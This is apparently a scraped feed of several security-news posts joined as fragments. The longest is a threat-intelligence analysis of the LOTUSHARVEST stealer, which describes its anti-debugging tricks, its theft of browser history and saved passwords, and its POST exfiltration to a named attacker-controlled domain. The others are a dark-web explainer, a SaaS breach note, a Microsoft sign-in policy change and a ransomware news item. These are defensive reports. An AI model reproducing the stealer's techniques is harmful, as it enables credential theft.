stealer. In the following section of this blog, we will explore its functionalities in detail.</p>\n<p><img alt=\"\" height=\"19\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-12-1.png\" width=\"420\" /></p>\n<p>Well, before diving into the core-functionalities and features of this implant, we also found an interesting PDB path, where the TA labels this as DEV-LOADER. But we are tracking this as LOTUSHARVESTER.</p>\n<h4><strong>Anti-Analysis Checks</strong></h4>\n<p><img alt=\"\" height=\"209\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-13-1-1024x310.png\" width=\"690\" /></p>\n<p>The implant did employ some of the anti-analysis methods, which we discovered such as it checks whether the program is running in a virtual environment, and if it detects that condition it forces a crash. to do this, and much more which are as follows.</p>\n<p><strong>IsProcessorFeaturePresent</strong>: It checks for a specific CPU feature and, if found, immediately triggers a fast-fail termination as an anti-analysis measure to evade execution on modern CPUs, VMs, or protected environments.</p>\n<p><strong>IsDebuggerPresent</strong>: A very common technique where it checks whether a user-mode debugger is attached. if a debugger is detected the program crashes.</p>\n<p><strong>Fake Exceptions</strong>: The program makes a fake crash by creating a fake exception and fake CPU state, changes where the code \u201cpretends\u201d to be running (RIP/RSP) and then sends it to UnhandledExceptionFilter(). This tricks debuggers, messes up the call stack, and hides what the program is really doing.</p>\n<p>Now, next moving ahead to the part, where the implant focuses on harvesting browser-based credentials.</p>\n<h2><strong>Browser History &amp; Saved Credentials Harvesting</strong></h2>\n<p><img alt=\"\" height=\"113\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-14-1.png\" width=\"690\" /></p>\n<p>Now, we saw that the other export known as DoMsCtfMonitor contains the malicious code, which performs certain functions.</p>\n<p><img alt=\"\" height=\"304\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-15-1-1024x452.png\" width=\"690\" /></p>\n<p>When examining the malicious function, we identified two key routines: one dedicated to harvesting credentials and another responsible for exfiltrating the collected data. Since this DLL implant operates primarily as an information stealer, its main focus is extracting sensitive browser-related information, as we will demonstrate in this section.</p>\n<p><img alt=\"\" height=\"194\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-16-1-1024x289.png\" width=\"690\" /><img alt=\"\" height=\"152\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-17-1-1024x226.png\" width=\"690\" /><img alt=\"\" height=\"61\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-18-1.png\" width=\"690\" /></p>\n<p>As, we can see that the implant targets browsers such as Google Chrome, Microsoft Edge and it does by initially opening and reading the contents of the files, then once they are collected, the implant attaches the computer name and username of the victim, which have been returned from functions such as GetComputerNameA and GetUserNameA, before beginning data exfiltration, creating a unique entry at the Threat Actor\u2019s end.</p>\n<p><img alt=\"\" height=\"128\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-19-1-1024x190.png\" width=\"690\" /></p>\n<p>In the above code fragments, we can see that the malware opens the browsers\u2019 SQLite <em>History</em> databases, runs a query to extract the 20 most recently visited URLs, and formats the results as a JSON array containing the URL, page title, visit count, and last visit time.</p>\n<p><img alt=\"\" height=\"90\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-20-1-1024x134.png\" width=\"690\" /></p>\n<p>It then opens the <em>Login Data</em> database, reads up to five stored login credentials, and attempts to decrypt each password using the classic CryptUnprotectData API.</p>\n<h1>Data Exfiltration</h1>\n<p><img alt=\"\" height=\"212\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-21-1-1024x316.png\" width=\"690\" /></p>\n<p>In the next function, we observed that the implant exfiltrates data using the Windows WinINet API. It opens an HTTP session and connects to the attacker-controlled server eol4hkm8mfoeevs.m.pipedream.net over port 443. After establishing the connection, it issues a POST request to the /service endpoint and sends the stolen browser information as a JSON payload.</p>\n<p>Now, in the next part, we will look into the infrastructural details related to the campaign.</p>\n<h1>Infrastructure &amp; Attribution</h1>\n<p>During the analysis, we observed that the payload communicates with multiple externally hosted endpoints. One of the domains identified was uuhlswlx[.]requestrepo[.]com, which is a randomly generated subdomain, whereas the other domain which we saw eol4hkm8mfoeevs[.]m[.]pipedream[.]net , is also a randomly generated sub-domain which had been primarily used for exfiltrating the harvested credentials. Therefore, that sums up brief the infrastructural details, related to this implant.</p>\n<p><img alt=\"\" height=\"406\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-22-1.png\" width=\"571\" /></p>\n<p>Now, using a very basic OSINT search, we also did come across the fact that the contact number, which the TA had used at the fake resume, which is +84912345678, belongs to a good store around the city of Hanoi, although it cannot be concrete as lot of times, wrong or fake contact numbers are populated at various locations.</p>\n<p><img alt=\"\" height=\"500\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-23-1-724x1024.png\" width=\"353\" /></p>\n<p>Well, focusing on the attribution-oriented details, requires concrete evidence on multiple parameters such as re-use of Tactics, Techniques &amp; Procedures), infrastructural re-use and victimology. As, previously, we have seen around the month of March, 2025, that likely <a href=\"https://x.com/PrakkiSathwik/status/1900966613022896275\" rel=\"noopener\" target=\"_blank\">Chinese-state sponsored threat group targeted Vietnam</a> with fake CV-based lure, where the name of the lure stands out to be CV-Nguyen-Lam-San-Xuat-Noi-Dung-Compress.pdf , also in this same campaign, we have seen the name of the lure to be `CV-Nguyen-Van-A, a similar nomenclature had been used, which adds a very little confidence to attribute both the campaigns under similar cluster of same threat entity.</p>\n<p>Well, another, very common yet simple overlap, between both the campaigns are the use of random DGA-oriented domains to deliver implants, as well as command-and-control(C2) servers have been used in both the campaigns, which again adds a very little confidence to attribute both the campaigns, and last, but not the least similarity between both the campaigns are usage of similar victimology, I.e., targeting software and recruitment industry.</p>\n<p>Now, as researchers, we believe that our bias should be relevant towards not only the overlaps, but as well, the unique non-similar artefacts, in this case, we see, that the threat actor, had deployed the LOTUSHARVEST implant, which functions like an information stealer, which raises concern, that Chinese-state-sponsored although abuse DLL-Sideloading but they deploy well-known implants such as PlugX and much more, therefore, considering, stealer, would be a conflicting and unique metric.</p>\n<p>Therefore, with medium-confidence focusing on overlaps and differences between previous threat campaigns which we have witnessed and their TTPs and much more, we have decided to attribute this threat-entity to be of Chinese-origin, although labelling it as state-sponsored still requires other important metrics as of now.</p>\n<h1>Conclusion</h1>\n<p>SEQRITE APT-Team identifies Operation Hanoi Thief as a spear\u2011phishing campaign aimed at IT and recruitment professionals in Vietnam. It uses fake resumes and shortcut files to trick victims, then abuses trusted Windows tools to run hidden scripts. The final payload, called LOTUSHARVEST, is a DLL implant that steals browser credentials and history before sending them to attacker servers. The tactics and overlaps with earlier activity suggest a Chinese\u2011origin threat actor, though state sponsorship is not confirmed.</p>\n<h1>Seqrite Protection</h1>\n<ul>\n<li>Trojan.50086.SL</li>\n<li>Trojan.A18678918</li>\n<li>Application</li>\n</ul>\n<h1>IOCs</h1>\n<table>\n<tbody>\n<tr>\n<td><strong>Hash (SHA-256)</strong></td>\n<td><strong>Malware Type</strong></td>\n</tr>\n<tr>\n<td>1beb8fb1b6283dc7fffedcc2f058836d895d92b2fb2c37d982714af648994fed</td>\n<td>ZIP File</td>\n</tr>\n<tr>\n<td>77373ee9869b492de0db2462efd5d3eff910b227e53d238fae16ad011826388a</td>\n<td>LNK File</td>\n</tr>\n<tr>\n<td>693ea9f0837c9e0c0413da6198b6316a6ca6dfd9f4d3db71664d2270a65bcf38</td>\n<td>Pseudo-polyglot payload (PDF,Batch)</td>\n</tr>\n<tr>\n<td>48e18db10bf9fa0033affaed849f053bd20c59b32b71855d1cc72f613d0cac4b</td>\n<td>DLL File</td>\n</tr>\n</tbody>\n</table>\n<h1>MITRE ATT&amp;CK</h1>\n<table>\n<tbody>\n<tr>\n<td><strong>Tactic</strong></td>\n<td><strong>Technique ID</strong></td>\n<td><strong>Technique Name</strong></td>\n</tr>\n<tr>\n<td>Initial Access</td>\n<td>T1566.001</td>\n<td>Spearphishing Attachment</td>\n</tr>\n<tr>\n<td>Resource Development</td>\n<td>T1587.001</td>\n<td>Develop Payloads: Malware</td>\n</tr>\n<tr>\n<td>Execution</td>\n<td>T1204.002</td>\n<td>User Execution: Malicious File</td>\n</tr>\n<tr>\n<td></td>\n<td>T1218</td>\n<td>Signed Binary Proxy Execution</td>\n</tr>\n<tr>\n<td>Defense Evasion</td>\n<td>T1036.007</td>\n<td>Masquerading: misleading file extension</td>\n</tr>\n<tr>\n<td></td>\n<td>T1140</td>\n<td>Deobfuscate File</td>\n</tr>\n<tr>\n<td>Privilege Escalation</td>\n<td>T1574.002</td>\n<td>DLL Side-Loading</td>\n</tr>\n<tr>\n<td>Discovery</td>\n<td>T1082</td>\n<td>System Information Discovery</td>\n</tr>\n<tr>\n<td></td>\n<td>T1012</td>\n<td>File system discovery for browser data</td>\n</tr>\n<tr>\n<td>Credential Access</td>\n<td>T1555.003</td>\n<td>Credentials from Password Stores</td>\n</tr>\n<tr>\n<td>Collection</td>\n<td>T1005</td>\n<td>Data from Local System</td>\n</tr>\n<tr>\n<td>Exfiltration</td>\n<td>T1041</td>\n<td>Exfiltration Over C2 Channel</td>\n</tr>\n<tr>\n<td>Command and Control</td>\n<td>T1071.001</td>\n<td>Web Protocol: HTTPS</td>\n</tr>\n</tbody>\n</table>\n<h1>Authors</h1>\n<ul>\n<li>Subhajeet Singha</li>\n<li>Priya Patel</li>\n</ul>\n<p>The post <a href=\"https://www.seqrite.com/blog/9479-2/\" rel=\"noopener\" target=\"_blank\">Operation Hanoi Thief: Threat Actor targets Vietnamese IT professionals and recruitment teams.</a> appeared first on <a href=\"https://www.seqrite.com/blog\" rel=\"noopener\" target=\"_blank\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n<p>Article Link: <a class=\"inline-onebox\" href=\"https://www.seqrite.com/blog/9479-2/\">operation-hanoi-thief-lNK-lotusharvest-vietnam-apt</a></p>\n            <p><small>1 post - 1 participant</small></p>\n            <p><a href=\"https://malware.news/t/operation-hanoi-thief-threat-actor-targets-vietnamese-it-professionals-and-recruitment-teams/102077\">Read full topic</a></p>",

Expect clear, evidence-based explanations, actionable advice, and no unnecessary technical fluff.</p>\n<blockquote>\n<h2>Introduction to Malware Binary Triage (IMBT) Course</h2>\n<p>Looking to level up your skills?

A clear definition for anyone</h2>\n<p>The simplest way to think about <strong><a href=\"https://www.dexpose.io/free-darkweb-report/\" rel=\"noopener\" target=\"_blank\">the dark web</a></strong> is that it\u2019s a subset of the internet intentionally hidden from standard search engines and casual browsers. It sits beneath the surface web (the content indexed by Google) and the deeper web (remote databases, behind-login pages). Unlike sites you access with a standard browser, dark web sites often require specialized software and network configurations to access. This architecture provides strong privacy protections and, at times, shelter for illicit activity.</p>\n<h2>How the dark web works: networks, anonymity, and access</h2>\n<h3>Tor I2P and the mechanics of privacy</h3>\n<p>Most users reach the hidden internet through anonymity networks. Tor is the most widely known: it routes traffic through multiple volunteer-run relays so that neither the sender nor the receiver is easily traceable. I2P and other overlay networks apply similar onion-routing concepts with different tradeoffs in speed and persistence.</p>\n<h3>Hidden services and addressing</h3>\n<p>Instead of regular domain names, many hidden sites use cryptographic addresses that aren\u2019t indexed by conventional search engines. That obscurity is both a strength and a weakness: it can protect dissidents and whistleblowers in repressive regimes, but it also makes illicit marketplaces harder to police.</p>\n<h2>Myths vs reality: common misconceptions about hidden online spaces</h2>\n<ul>\n<li><strong>Myth:</strong> Everything on the unlit web is illegal.</li>\n<li><strong>Reality:</strong> Many legitimate uses exist: secure communication for journalists, privacy-focused communities, research, and circumvention of censorship.</li>\n<li><strong>Myth:</strong> Using the dark web automatically makes you a target.</li>\n<li><strong>Reality:</strong> Risk varies by activity. Passive browsing is different from participating in markets or downloading unknown files.</li>\n<li><strong>Myth:</strong> Law enforcement can\u2019t touch anything there.</li>\n<li><strong>Reality:</strong> Agencies have disrupted marketplaces and made arrests using targeted operations, infiltration, and digital forensics.</li>\n</ul>\n<h2>How criminals operate on hidden networks: tactics and trends</h2>\n<p>Understanding typical threats is essential for strong <strong><a href=\"https://www.dexpose.io/\" rel=\"noopener\" target=\"_blank\">Digital Risk Protection</a></strong>. Key illicit activities include stolen data markets, malware-as-a-service, and fraud forums. These services are often supported by reputation systems, escrow mechanisms, and vendor feedback systems similar to those of legitimate e-commerce marketplaces.</p>\n<ul>\n<li><strong>Data trafficking:</strong> Compromised credentials and personal data are packaged and sold. This feeds identity theft and account takeover.</li>\n<li><strong>Malware &amp; services:</strong> Ransomware groups, botnet operators, and phishing-as-a-service vendors coordinate operations and trade tools.</li>\n<li><strong>Forums &amp; intelligence sharing:</strong> Actors exchange techniques, test vulnerabilities, and trade access to corporate networks.</li>\n</ul>\n<h2>Why the dark web matters for you and your organization</h2>\n<p>Even if you never visit a hidden site, the consequences reach far beyond its bounds. Stolen credentials sold there can unlock personal accounts, corporate systems, and financial services. For small businesses and enterprises alike, a single leaked database can cause reputational damage, regulatory penalties, and costly incident response.</p>\n<h2>Detecting exposure: scans, reports, and monitoring explained</h2>\n<p>Organizations and individuals can detect exposure by combining automated scans, intelligence feeds, and manual investigation.</p>\n<ul>\n<li>Dark Web Scan tools crawl adversary markets and paste sites to locate leaked credentials and sensitive data.</li>\n<li>A <strong><a href=\"https://www.dexpose.io/free-darkweb-report/\" rel=\"noopener\" target=\"_blank\">Darkweb report</a></strong> summarizes findings, risk level, and recommended remediation steps after an investigation.</li>\n<li><a href=\"https://www.dexpose.io/darkweb-breaches-monitoring/\" rel=\"noopener\" target=\"_blank\"><strong>Dark Web breach Monitoring</strong></a> provides continuous alerts for newly discovered data tied to your domain, brand, or personal emails.</li>\n</ul>\n<p>Each of the terms above refers to capabilities available from vendors and open-source projects. Choosing the right mix relies on budget and needs.</p>\n<h2>Hands-on protection: practical steps anyone can follow</h2>\n<p><strong>Here\u2019s a concise, prioritized checklist you can use immediately:</strong></p>\n<ul>\n<li>Use unique, strong passwords and a reputable password manager.</li>\n<li>Enable multi-factor authentication on all accounts that support it.</li>\n<li>Run periodic scans to check if email is compromised and change credentials for affected accounts.</li>\n<li>Keep devices and software up to date to patch common exploit vectors.</li>\n<li>Avoid reusing corporate credentials on personal services or vice versa.</li>\n</ul>\n<h2>Tools and tactics: selecting monitoring and response options</h2>\n<p><strong>Many organizations use a layered approach:</strong></p>\n<h3>Monitoring and response options at a glance</h3>\n<table>\n<thead>\n<tr>\n<th>Category</th>\n<th>Typical Capabilities</th>\n<th>Free Option?</th>\n<th>Best for</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Basic email checks</td>\n<td>Scan public breaches for email addresses</td>\n<td>Some free Dark Web Monitoring tools exist</td>\n<td>Individuals &amp; small businesses</td>\n</tr>\n<tr>\n<td>Continuous breach monitoring</td>\n<td>24/7 alerts for brand, domain, or email exposure</td>\n<td>Usually paid</td>\n<td>Enterprises, SOC teams</td>\n</tr>\n<tr>\n<td>Manual intelligence collection</td>\n<td>Targeted searches, forum monitoring, Open Source Intelligence collection</td>\n<td>Free but labor-intensive</td>\n<td>Security researchers</td>\n</tr>\n<tr>\n<td>Forensic investigations</td>\n<td>Deep Darkweb report with context and attribution</td>\n<td>Paid</td>\n<td>Incident response teams</td>\n</tr>\n<tr>\n<td>Automated remediation</td>\n<td>Password resets, MFA enforcement, account lockouts</td>\n<td>Paid integrations</td>\n<td>Large orgs / MSSPs</td>\n</tr>\n</tbody>\n</table>\n<h2>Free vs paid solutions: when to upgrade</h2>\n<ul>\n<li>Free tools are helpful for spot checks and personal use. They can tell you if an email appears in public dumps or pastes, but they often lack continuous coverage and deep context.</li>\n<li>Paid <strong><a href=\"https://www.dexpose.io/darkweb-breaches-monitoring/\" rel=\"noopener\" target=\"_blank\">Dark Web Monitoring tools</a></strong> typically provide broader visibility, higher-quality enrichment (who exposed the data and where it appears), and integration with security stacks for automated responses.</li>\n</ul>\n<p>If you\u2019re a small business, start with free checks to assess baseline risk; upgrade when exposure becomes frequent or sensitive data is involved.</p>\n<h2>Using Open Source Intelligence (OSINT) and cyber threat intelligence effectively</h2>\n<p>Combining <strong><a href=\"https://www.dexpose.io/open-source-intelligence-tools-and-techniques-explained/\" rel=\"noopener\" target=\"_blank\">Open Source Intelligence</a></strong> with Cyber threat intelligence enhances context. OSINT helps locate mentions of your organization or personnel across forums, paste sites, and social platforms. Cyber threat intelligence enriches those findings with indicators of compromise, attacker TTPs (tactics, techniques, and procedures), and recommended mitigations. Together, they reduce false positives and accelerate response.</p>\n<h2>How to run a darkweb search safely and legally</h2>\n<p>A targeted <strong><a href=\"https://www.dexpose.io/free-darkweb-report/\" rel=\"noopener\" target=\"_blank\">darkweb search</a></strong> involves scanning relevant marketplaces, forums, and dump sites for your organization\u2019s domain names, brand names, or employee email addresses. Best practices:</p>\n<ol>\n<li>Use a secure, isolated environment (air-gapped or VM) for investigations.</li>\n<li>Never interact or transact on illicit marketplaces. Collect only observable data.</li>\n<li>Maintain legal counsel and follow local laws when conducting active research.</li>\n</ol>\n<h2>Response playbook: what to do if your data appears in a leak</h2>\n<p>If a scan or <strong><a href=\"https://www.dexpose.io/dark-web-email-scan-quickly-find-leaks-secure-accountsnow/\" rel=\"noopener\" target=\"_blank\">Dark Web email scan</a></strong> shows exposure, act immediately:</p>\n<img alt=\"Visual representation of threats linked to the Dark Web.\" height=\"459\" src=\"https://dexpose-wpadmin-home.teleport.dexpose.io/wp-content/uploads/2025/11/the-Dark-Web-1.jpg\" width=\"690\" />Key security risks originating from the Dark Web.\n<ol>\n<li><strong>Contain:</strong> Reset affected credentials and enforce MFA.</li>\n<li><strong>Assess:</strong> Use a Darkweb report or forensic analysis to understand what leaked (passwords, financial details, PII).</li>\n<li><strong>Notify:</strong> Inform affected stakeholders and regulators where required by law.</li>\n<li><strong>Remediate:</strong> Patch vulnerabilities, rotate secrets, and tighten logging/monitoring.</li>\n<li><strong>Monitor:</strong> Increase Breaches Monitoring for related artifacts.</li>\n</ol>\n<h2>Which indicators are urgent? Signs you may be compromised</h2>\n<p><strong>Look for these red flags:</strong></p>\n<ul>\n<li>Unexplained logins from unfamiliar locations or devices.</li>\n<li>Multiple password reset attempts across services.</li>\n<li>Receipt of targeted phishing emails referencing internal details.</li>\n<li>Sudden appearance of company credentials in public paste sites or marketplaces.</li>\n</ul>\n<p>If you see any of these, prioritize an investigation.</p>\n<h2>Privacy, ethics, and legal considerations</h2>\n<p><strong>Researching the hidden web can expose investigators to illicit content and legal risk. Always:</strong></p>\n<ul>\n<li>Follow applicable laws and company policies.</li>\n<li>Avoid downloading illegal material.</li>\n<li>Work with legal and compliance teams before acting on intelligence that could trigger mandatory breach notifications.</li>\n</ul>\n<h2>Building an organizational program: roles and responsibilities</h2>\n<p><strong>A mature program typically involves:</strong></p>\n<ul>\n<li>Security Operations (SOC): Continuous monitoring and triage.</li>\n<li>Incident Reaction: Containment, forensics, and remediation.</li>\n<li>Legal &amp; Compliance: Notification obligations and regulatory reporting.</li>\n<li>Communications/PR: Transparent messaging for affected users and customers.</li>\n<li>HR &amp; Identity teams: Managing compromised employee accounts and credential hygiene.</li>\n</ul>\n<h2>Free Dark Web Monitoring tools when they help</h2>\n<p><strong><a href=\"https://www.dexpose.io/darkweb-breaches-monitoring/\" rel=\"noopener\" target=\"_blank\">Free Dark Web Monitoring tools</a></strong>, along with other free services and community-maintained feeds, are valuable first steps. They can quickly tell you whether an email address has appeared in known dumps. However, they rarely offer the breadth, speed, or investigative depth of paid feeds. Use these free tools for initial detection and education, then move to paid monitoring if you require continuous coverage.</p>\n<h2>Case study snippets: what went wrong (and how it could have been prevented)</h2>\n<ul>\n<li><strong>Retail breach:</strong> A small retailer reused database credentials; attackers exfiltrated payment records that showed up on underground markets. Prevention: separate credentials, better secrets management, and continuous breach monitoring.</li>\n<li><strong>Phishing campaign:</strong> Attackers used stolen employee emails to craft highly targeted messages, winning password resets. Prevention: mandatory MFA, phishing-resistant authentication, and user training.</li>\n</ul>\n<h2>Practical guide: how to check if your email is compromised (step-by-step)</h2>\n<ol>\n<li>Use reputable services to <strong><a href=\"https://www.dexpose.io/email-data-breach-scan/\" rel=\"noopener\" target=\"_blank\">check if email is compromised</a></strong>.

Whether you\u2019re an individual checking an email or an enterprise building a monitoring program, a pragmatic, evidence-driven approach will keep you safer than fear-driven avoidance.</p>\n<h2>FAQs</h2>\n<h3>What exactly is the dark web?</h3>\n<p>It\u2019s a portion of the internet that\u2019s not indexed by definitive search engines and often requires special software to access. It houses both legitimate privacy-focused services and illicit markets.</p>\n<h3>Can I check if my email has been leaked?</h3>\n<p>Yes, several reputable services and scans let you check breaches. If your address appears, change passwords, enable MFA, and monitor related accounts.</p>\n<h3>Are free Dark Web Monitoring tools useful?</h3>\n<p>They\u2019re a good starting point for individuals or small businesses, but lack continuous, comprehensive coverage compared to paid solutions.</p>\n<h3>Will law enforcement investigate dark web leaks?</h3>\n<p>Sometimes investigations depend on the nature and scale of the crime, available evidence, and jurisdictional factors.</p>\n<h3>Should my company run a Dark Web Scan regularly?</h3>\n<p>Yes. Regular scanning and ongoing Dark Web breach Monitoring reduce detection lag and improve response times after a leak.</p>\n<p>Article Link: <a href=\"https://www.dexpose.io/a-deep-look-into-the-dark-webs-mysterious-world/\">https://www.dexpose.io/a-deep-look-into-the-dark-webs-mysterious-world/</a></p>\n            <p><small>1 post - 1 participant</small></p>\n            <p><a href=\"https://malware.news/t/a-deep-look-into-the-dark-web-s-mysterious-world/102074\">Read full topic</a></p>",

The calls originated from non-allowlisted IP addresses through Gainsight applications integrated with Salesforce. To date, three unnamed customers are suspected to have been impacted. In response, Salesforce immediately &lt;a href=\"https://help.salesforce.com/s/articleView?id=005229029&amp;amp;type=1\" rel=\"noreferrer\" target=\"_blank\"&gt;revoked&lt;/a&gt; access tokens associated with Gainsight applications, restricted integration functionality, and launched an investigation.&lt;/p&gt;\n    &lt;p&gt;The incident disrupted several Gainsight services, including Customer Success (CS), Community, Northpass, Skilljar, and Staircase, temporarily disabling their ability to read and write data from Salesforce. As a precautionary measure, other platforms, including Zendesk, Gong.io, and HubSpot, also disabled related CS connectors.&lt;/p&gt;\n    &lt;h2&gt;The threat landscape connection&lt;/h2&gt;\n    &lt;p&gt;Analysis of the indicators of compromise (IoCs) revealed concerning patterns. Some IP addresses involved in this incident, such as 109.70.100[.]68 and 109.70.100[.]71, were previously linked to an August 2025 campaign in which the financially motivated threat cluster UNC6040 compromised Salesforce CRM environments to exfiltrate sensitive data, indicating possible reuse of infrastructure against CRM targets. The August 2025 campaign reportedly coordinated with UNC6240, which claimed affiliation with the ShinyHunters extortion group, to demand payment from affected organizations.&lt;/p&gt;\n    &lt;p&gt;Most of the IP addresses identified are Tor exit nodes or commodity proxy/VPN infrastructure with histories of abuse for malicious activities, including scanning, brute-force attacks, and web exploitation. This suggests that the threat actors are using shared anonymity services rather than custom command-and-control (C2) infrastructure.&lt;/p&gt;\n    &lt;p&gt;Intelligence analysis also revealed malware samples communicating with these IP addresses across commodity families, including SmokeLoader, Stealc, DCRat, and Vidar.&lt;/p&gt;\n    &lt;p&gt;While Gainsight has stated that it hasn\u2019t identified evidence of data exfiltration, and while a specific threat actor has yet to be confirmed, the investigation is ongoing.&lt;/p&gt;\n    &lt;h2&gt;The broader risk: supply-chain compromise&lt;/h2&gt;\n    &lt;p&gt;This incident highlights a critical vulnerability in modern enterprise architecture: the risk of supply-chain compromise through trusted SaaS integrations. When OAuth tokens, API keys, and service accounts enable persistent access to enterprise CRM data, a breach in one connected application can potentially expose sensitive information across multiple platforms.&lt;/p&gt;\n    &lt;p&gt;Despite no evidence of data exfiltration so far, customers using Gainsight-Salesforce integrations may face unauthorized access or credential misuse until proper reauthorization is completed. The potential exposure may extend beyond Gainsight to other connected applications, such as Zendesk, HubSpot, and Gong.io, that share authentication or data pipelines.&lt;/p&gt;\n    &lt;h2&gt;Immediate actions for affected organizations&lt;/h2&gt;\n    &lt;p&gt;Gainsight has already taken defensive measures, including rotating multi-factor credentials and restricting access to its VPN and critical infrastructure. However, customers who suspect exposure should consider taking the following actions:&lt;/p&gt;\n    &lt;p&gt;&lt;strong&gt;Critical security steps:&lt;/strong&gt;&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;Revoke and rotate OAuth tokens and API keys associated with the Gainsight-Salesforce Connected App.&lt;/li&gt;\n      &lt;li&gt;Review Salesforce and Gainsight logs for anomalous API traffic, unexpected IP sources, or mass data exports.&lt;/li&gt;\n      &lt;li&gt;Apply IP allowlists to block connections from published IoCs.&lt;/li&gt;\n      &lt;li&gt;Implement conditional access and device trust validation for all connected apps.&lt;/li&gt;\n      &lt;li&gt;Enforce multi-factor authentication and reset access credentials on all privileged accounts.&lt;/li&gt;\n      &lt;li&gt;Isolate integrations with third-party vendors until reauthorization guidance is confirmed.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;p&gt;&lt;strong&gt;Gainsight-specific recommendations:&lt;/strong&gt;&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;Rotate S3 keys.&lt;/li&gt;\n      &lt;li&gt;Reset NXT passwords.&lt;/li&gt;\n      &lt;li&gt;Reauthorize affected integrations.&lt;/li&gt;\n      &lt;li&gt;Log in directly to NXT until the Salesforce Connected App is fully restored.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;h2&gt;Looking ahead&lt;/h2&gt;\n    &lt;p&gt;As organizations increasingly rely on interconnected SaaS applications to power their operations, the security posture of each integration point becomes critical. This incident serves as a reminder that third-party applications with deep integrations into core business systems represent both operational efficiency and potential attack vectors.&lt;/p&gt;\n    &lt;p&gt;Organizations should evaluate their connected application ecosystems, implement zero-trust principles for API access, and ensure robust monitoring of authentication and authorization activities across all integrated platforms. The days of \"set and forget\" SaaS integrations are over. Continuous validation and monitoring are essential to maintaining security in a connected enterprise environment.&lt;/p&gt;\n    &lt;p&gt;Learn how to stay ahead of emerging threats. &lt;a href=\"https://www.recordedfuture.com/get-started\" rel=\"noreferrer\" target=\"_blank\"&gt;Contact us to speak with one of our threat intelligence experts&lt;/a&gt;.&lt;/p&gt;\n</code></pre>\n<p>Article Link: <a class=\"inline-onebox\" href=\"https://www.recordedfuture.com/blog/salesforce-gainsight-security-incident\">The Salesforce-Gainsight Security Incident: What You Need to Know</a></p>\n            <p><small>1 post - 1 participant</small></p>\n            <p><a href=\"https://malware.news/t/the-salesforce-gainsight-security-incident-what-you-need-to-know/102066\">Read full topic</a></p>",

It will only allow scripts from trusted Microsoft domains to execute, effectively blocking malicious or injected code.</p>\n<p>This initiative is part of Microsoft\u2019s broader Secure Future Initiative (SFI), a multi-year commitment to prioritizing security in product design and defending against evolving cyber threats. Learn more about SFI here: <a href=\"https://www.microsoft.com/en-us/trust-center/security/secure-future-initiative\" rel=\"noopener\" target=\"_blank\">Microsoft Secure Future Initiative</a>.</p>\n<p>The updated CSP will specifically restrict script downloads to Microsoft\u2019s trusted CDN domains and inline script execution to a Microsoft trusted source. This applies to browser-based sign-in flows, not Microsoft Entra External ID.</p>\n<p>Microsoft is urging organizations to test their sign-in flows thoroughly ahead of the mid-to-late October 2026 rollout to ensure a smooth transition and no disruptions to the user experience.</p>\n<p>They also advise customers to avoid using browser extensions or tools that inject code into the Microsoft Entra sign-in experience, recommending alternative tools if necessary.</p>\n<p>To identify any CSP violations, users can check their browser\u2019s developer console for \u201cRefused to load the script\u201e errors related to \u201cscript-src\u201d and \u201cnonce\u201e directives.

      "summary": "<p>A nationwide cyberattack against the OnSolve CodeRED emergency notifications system has prompted cities and counties across the US to warn residents and advise them to change their passwords. </p>\n<blockquote>\n<h2>Introduction to Malware Binary Triage (IMBT) Course</h2>\n<p>Looking to level up your skills?

Both the data breach and the service outage have serious implications for communities.</p>\n<p>The OnSolve CodeRED system is a cloud-based platform used by city, county, and state agencies to send emergency alerts via voice calls, SMS, email, mobile app notifications, and national alerting systems. Because of the incident, some regions temporarily lost access to the system and had to rely on social media or other methods to reach the public.</p>\n<p>To avoid confusion: CodeRED is not the same as the Emergency Alert System (EAS), which is the federal government-managed emergency notifications system. The CodeRED emergency notification system is a voluntary program where residents can sign up to receive notifications and emergency alerts affecting the city they live in.</p>\n<h2>What\u2019s happened?</h2>\n<p>Among the many affected municipalities, the City of Cambridge\u2019s Emergency Communications, Police, and Fire Departments <a href=\"https://www.cambridgema.gov/Departments/cambridgepolice/News/2025/11/communitynoticecyberattackagainstcodered\" rel=\"noopener\" target=\"_blank\">issued an alert</a> urging users to change their passwords, especially if they reused the same password elsewhere. Similar advisories have been published by towns and counties in multiple states as the scale of the attack became clear.</p>\n<p>The City of University Park, Texas, also <a href=\"https://www.uptexas.org/312/Emergency-Notifications\" rel=\"noopener\" target=\"_blank\">warned</a> residents:</p>\n<blockquote>\n<p>\u201cAs a precaution, we want to make residents aware of a recent cybersecurity incident involving the City\u2019s third-party emergency alert system, CodeRED. We were notified that a cybercriminal group targeted the system, which caused disruption and may have compromised some user data. This incident did not affect any City systems or services and remains isolated to the CodeRED software.\u201d</p>\n</blockquote>\n<p>The cause is <a href=\"https://www.bleepingcomputer.com/news/security/onsolve-codered-cyberattack-disrupts-emergency-alert-systems-nationwide/\" rel=\"noopener\" target=\"_blank\">reportedly</a> a ransomware attack claimed by the INC Ransom group. The group posted screenshots that appear to show stolen customer data, including email addresses and associated clear-text passwords. </p>\n<p>The INC Ransom group also published part of the alleged ransom negotiation, suggesting that Crisis24 (the provider behind CodeRED) initially offered $100,000, later increasing the offer to $150,000, which INC rejected.</p>\n<p><img alt=\"INC Ransom leak site\" height=\"290\" src=\"https://www.malwarebytes.com/wp-content/uploads/sites/2/2025/11/INC_ransom_16c662.png?w=1024\" width=\"690\" /></p>\n<p>The incident forced Crisis24 to shut down its legacy environment and rebuild the system in a new, isolated infrastructure. Some regions, such as Douglas County, Colorado, have <a 